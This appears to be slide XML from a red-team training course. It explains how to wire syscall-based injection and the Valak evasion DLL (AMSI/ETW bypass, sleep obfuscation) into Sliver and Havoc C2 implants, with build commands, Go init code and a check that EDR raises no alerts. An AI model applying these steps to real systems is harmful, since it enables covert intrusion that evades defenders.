                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> bypasses API Monitor).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Task 03 Part 4: Integration with C2</a:t>
            </a:r>
            <a:endPar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17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What This Means</a:t>
            </a:r>
            <a:endPar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After verifying your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscall</a:t>
            </a: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stub works, you must make it the default injection method for your C2 implant. Every subsequent shellcode injection—for lateral movement, privilege escalation, or persistence—should use direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls</a:t>
            </a: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instead of standard Windows APIs. This ensures the EDR remains blind to all post-exploitation activities originating from your implant.</a:t>
            </a:r>
          </a:p>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Integration approaches differ between Sliver and Havoc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1731267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316F78-9526-4148-8F77-70F2B24D65A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Option A: Sliver C2</a:t>
            </a:r>
            <a:endPar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Sliver implants are written in Go, which has limitations for low-level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syscall</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execution due to its runtime's management of stacks and goroutines. Therefore, the most practical approach is to use Sliver's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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extension system</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or a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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custom DLL</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loaded reflectively into the implant process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Approach 1: Using an Evasion DLL (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"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Valak</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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endPar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Valak</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is a standalone Zig evasion DLL built for Sliver implants. It provides drop-in sleep obfuscation, AMSI/ETW bypass,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callstack</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spoofing, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"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FreshyCalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"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syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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dispatch</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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1: Clone and build </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"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Valak</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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endPar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git clone https://git.churchofmalware.org/JYenn/Valak.git</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cd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Valak</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/evasion</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zig build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Doptimize</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ReleaseFast</a:t>
            </a:r>
            <a:endPar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2: Embed the compiled DLL into Sliver:</a:t>
            </a:r>
            <a:endPar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Copy the compiled DLL bytes into go-bridge/</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embed_dll.go</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var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embeddedDLL</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[]byte{ // paste compiled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dll</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bytes }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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3: Integrate into Sliver's implant:</a:t>
            </a:r>
            <a:endPar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Copy go-bridge/ into implant/sliver/evasion/</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valak</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12094577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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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4: Modify Sliver's implant initialization:</a:t>
            </a:r>
            <a:endPar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import "github.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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BishopFox</a:t>
            </a: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/sliver/implant/sliver/evasion/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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valak</a:t>
            </a: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p>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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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func</a:t>
            </a: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r>
              <a:rPr lang="en-US" sz="17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init</a:t>
            </a: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p>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r>
              <a:rPr lang="en-US" sz="17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valak.Start</a:t>
            </a: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p>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go </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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func</a:t>
            </a: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p>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r>
              <a:rPr lang="en-US" sz="17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time.Sleep</a:t>
            </a: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(2 * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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time.Second</a:t>
            </a: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wait for DLL load</a:t>
            </a:r>
          </a:p>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r>
              <a:rPr lang="en-US" sz="17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valak.PatchAll</a:t>
            </a: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p>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p>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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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5: Replace sleep calls in Sliver's beacon loop:</a:t>
            </a:r>
            <a:endPar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Replace </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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time.Sleep</a:t>
            </a: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(d) with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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valak.EvasionSleep</a:t>
            </a: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(d)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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6: Rebuild Sliver with the evasion tag:</a:t>
            </a:r>
            <a:endPar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go build -tags evasion</a:t>
            </a:r>
          </a:p>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All subsequent injection operations will now use indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="322906674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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Approach 2: Sliver Extensions (COFF Loader)</a:t>
            </a:r>
            <a:endPar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Sliver's extension system allows you to reflectively load shared libraries (.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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dll</a:t>
            </a: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or object files (.o) into the implant process. The COFF Loader extension loads and executes Beacon Object Files (BOFs).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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1: Create a BOF that performs syscall-based injection:</a:t>
            </a:r>
            <a:endPar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Write a BOF that uses the syscall stubs generated in Part 1 (Syswhispers3 or Hell's Gate).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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2: Place the BOF in Sliver's extension directory:</a:t>
            </a:r>
            <a:endPar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~/.sliver-client/extensions/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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your_bof</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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3: Execute the BOF via Sliver:</a:t>
            </a:r>
            <a:endPar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execute-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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bof</a:t>
            </a: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/path/to/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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your_bof.o</a:t>
            </a:r>
            <a:endPar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The BOF runs in memory using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls</a:t>
            </a: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bypassing EDR hooks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Approach 3: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1"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CrystalSliver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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(Crystal Palace Evasion Kit)</a:t>
            </a:r>
            <a:endPar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indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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CrystalSliver</a:t>
            </a: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wraps the raw Sliver implant DLL in a custom stager that decrypts and executes it in memory. While this focuses on delivery rather than injection, it can be combined with syscall-based techniques.</a:t>
            </a:r>
          </a:p>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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Option B: Havoc C2</a:t>
            </a:r>
            <a:endPar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Havoc's Demon implant is written in C and ASM, making syscall integration straightforward.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16444633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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Approach 1: Enable Indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1"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Syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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Compile Time</a:t>
            </a:r>
            <a:endPar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Havoc supports </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1"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syscalls</a:t>
            </a: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natively when compiled with the OBF_SYSCALL flag. For many </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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Nt</a:t>
            </a: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APIs, Demon performs indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls</a:t>
            </a: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by default.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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1: Locate the Demon source:</a:t>
            </a:r>
            <a:endPar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r>
              <a:rPr lang="en-US" sz="17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Teamserver</a:t>
            </a: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/data/implants/Demon/Source/Core/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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Syscalls.c</a:t>
            </a:r>
            <a:endPar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Syscall stubs are dynamically crafted from ntdll.dll on disk and modified so the return address points to a location within ntdll.dll.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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2: Add Syswhispers3 files to the Visual Studio project:</a:t>
            </a:r>
            <a:endPar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1. Add the three Syswhispers3 files (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls.h</a:t>
            </a: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r>
              <a:rPr lang="en-US" sz="17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syscalls.c</a:t>
            </a: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syscalls_asm.x64.asm) to the Havoc Demon Visual Studio project.</a:t>
            </a:r>
          </a:p>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2. Enable MASM support in the project.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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3: Compile Demon with the OBF_SYSCALL flag:</a:t>
            </a:r>
            <a:endPar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When generating the implant from the Havoc client, ensure the profile has OBF_SYSCALL enabled.</a:t>
            </a:r>
          </a:p>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Alternatively, modify the build configuration to include OBF_SYSCALL.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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Approach 2: Modify Injection Commands to Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1"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Syscalls</a:t>
            </a:r>
            <a:endPar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Havoc's Demon can inject shellcode into remote processes using process injection or fork &amp; run. Depending on the technique, operators can choose to use higher-level Win32 APIs or NT versions using indirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28926948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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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The Syscall logic is primarily contained within:</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Teamserver</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/data/implants/Demon/Source/Core/</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Syscalls.c</a:t>
            </a:r>
            <a:endPar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To ensure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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all</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injections use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syscalls</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modify the injection command implementations in the Demon source to call the syscall functions from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Syscalls.c</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instead of standard Win32 APIs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Approach 3: Existing Evasion Features</a:t>
            </a:r>
            <a:endPar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Havoc Demon already includes several evasion features:</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Indirect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Syscalls</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for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Nt</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APIs (when compiled with OBF_SYSCALL)</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x64 return address spoofing</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Sleep Obfuscation via Ekko,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Ziliean</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or FOLIAGE</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AMSI and ETW patching options</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By enabling these features in the profile, your implant will use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syscalls</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for many operations automatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Verification – Confirming Integration Works</a:t>
            </a:r>
            <a:endPar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1: Deploy the integrated implant to the target VM:</a:t>
            </a:r>
            <a:endPar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1. Generate a new implant with syscall support enabled.</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2. Deploy it to the Windows VM.</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3. Get an active session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="248610537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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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2: Perform an injection operation:</a:t>
            </a:r>
            <a:endPar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From the C2 console, run an injection command (e.g., inject into notepad.exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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3: Capture Process Monitor trace:</a:t>
            </a:r>
            <a:endPar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1. Open Process Monitor on the target VM.</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2. Apply a filter for the target process (notepad.exe).</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3. Observe the call stack.</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You should see:</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notepad.exe →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YourStub</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syscall</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No ntdll.dll functions (hooked by EDR) should appear.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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4: Verify no EDR alerts:</a:t>
            </a:r>
            <a:endPar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Check the EDR dashboard (if available). No alerts should be generated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Important Notes</a:t>
            </a:r>
            <a:endPar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lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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For Sliver, the Go runtime limits certain low-level techniques. Use the extension/DLL approach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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For Havoc, OBF_SYSCALL must be enabled at compile time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Always test your integrated implant in a lab environment first.</a:t>
            </a:r>
